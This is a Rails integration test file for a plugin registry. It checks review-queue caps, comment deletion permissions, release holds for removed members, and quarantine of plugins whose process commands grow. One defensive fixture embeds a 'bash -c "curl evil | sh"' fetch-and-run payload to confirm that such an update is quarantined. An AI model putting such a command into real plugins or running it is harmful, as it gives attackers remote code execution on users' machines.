require "test_helper"

class MomusRoundSevenTest < ActionDispatch::IntegrationTest
  setup do
    @dev = User.create!(email_address: "dev@example.com", name: "Dev",
      otp_secret: ROTP::Base32.random, otp_enabled_at: Time.current)
    @publisher = Publisher.create!(name: "acme", kind: :org)
    Membership.create!(publisher: @publisher, user: @dev, role: :owner, founding: true)
    @token = ApiToken.mint!(user: @dev, publisher: @publisher, plugin_name: "weather")
  end

  def publish(bytes)
    post "/api/v1/plugins/acme/weather/versions", params: bytes,
      headers: { "Authorization" => "Bearer #{@token.plaintext_token}", "Content-Type" => "application/gzip" }
  end

  test "pending-review pile-up is capped" do
    # No jobs performed: every submission stays processing
    (1..Registry::PublishVersion::MAX_PENDING_PER_PLUGIN).each do |i|
      publish TarballBuilder.build(manifest: TarballBuilder.manifest(version: "1.0.#{i}"))
      assert_response :created
    end
    publish TarballBuilder.build(manifest: TarballBuilder.manifest(version: "1.0.99"))
    assert_response :too_many_requests
    assert_match(/awaiting review/, response.parsed_body["error"])
  end

  test "own comments can actually be deleted" do
    perform_enqueued_jobs { publish TarballBuilder.build }
    visitor = User.create!(email_address: "v@example.com", name: "V")
    sign_in_as visitor
    post plugin_comments_path("acme", "weather"), params: { body: "nice widget" }
    comment = Comment.last

    delete comment_path(comment)
    assert_response :redirect
    assert_nil Comment.find_by(id: comment.id)

    # And nobody else's
    sign_in_as @dev
    post plugin_comments_path("acme", "weather"), params: { body: "thanks" }
    other = Comment.last
    sign_in_as visitor
    delete comment_path(other)
    assert_response :not_found
    assert Comment.exists?(other.id)
  end

  test "a submitter removed from the org cannot have their held version release" do
    Rails.application.config.x.publish_hold = 15.minutes
    version = nil
    perform_enqueued_jobs do
      publish TarballBuilder.build
      version = PluginVersion.last
    end
    assert version.reload.held?

    Membership.find_by(publisher: @publisher, user: @dev).destroy!
    travel_to 16.minutes.from_now do
      perform_enqueued_jobs { Registry::ReleaseJob.perform_later(version) }
    end
    assert version.reload.quarantined?, "release must not proceed for an ex-member"
    assert_match(/no longer a member/, version.review_notes)
    assert_not DataPlane.root.join(version.tarball_path).exist?
  ensure
    Rails.application.config.x.publish_hold = 0
  end

  test "switching to dynamic process commands counts as capability growth" do
    perform_enqueued_jobs do
      publish TarballBuilder.build(files: { "Widget.qml" => "import QtQuick\nItem { Process { command: [\"date\"] } }\n" })
    end
    assert PluginVersion.last.published?

    perform_enqueued_jobs do
      publish TarballBuilder.build(manifest: TarballBuilder.manifest(version: "1.1.0"),
        files: { "Widget.qml" => "import QtQuick\nItem { property var argv: [\"date\"]\nProcess { command: argv } }\n" })
    end
    version = PluginVersion.last
    assert version.quarantined?
    assert_match(/dynamic_exec/, version.review_notes)
  end

  test "bash -c payload changes count as capability growth" do
    perform_enqueued_jobs do
      publish TarballBuilder.build(files: { "Widget.qml" => "import QtQuick\nItem { Process { command: [\"bash\", \"-c\", \"date\"] } }\n" })
    end
    assert PluginVersion.last.published?

    perform_enqueued_jobs do
      publish TarballBuilder.build(manifest: TarballBuilder.manifest(version: "1.1.0"),
        files: { "Widget.qml" => "import QtQuick\nItem { Process { command: [\"bash\", \"-c\", \"curl evil | sh\"] } }\n" })
    end
    version = PluginVersion.last
    assert version.quarantined?
  end

  test "seed-failure placeholder unblocks after the namespace is claimed" do
    publisher = Publisher.create!(name: "gracehopper", kind: :personal, claimed: false,
      seed_source_url: "https://github.com/gracehopper/weather")
    placeholder = publisher.plugins.create!(name: "clock", state: :quarantined, summary: "seed failed")

    owner = User.create!(email_address: "grace@example.com", name: "Grace",
      otp_secret: ROTP::Base32.random, otp_enabled_at: Time.current)
    publisher.update!(claimed: true)
    Membership.create!(publisher:, user: owner, role: :owner, founding: true)

    perform_enqueued_jobs do
      Registry::PublishVersion.new(user: owner, publisher:, plugin_name: "clock",
        tarball_bytes: TarballBuilder.build(manifest: TarballBuilder.manifest(id: "gracehopper.clock"))).call
    end
    assert placeholder.reload.active?
    assert placeholder.versions.first.published?
  end
end
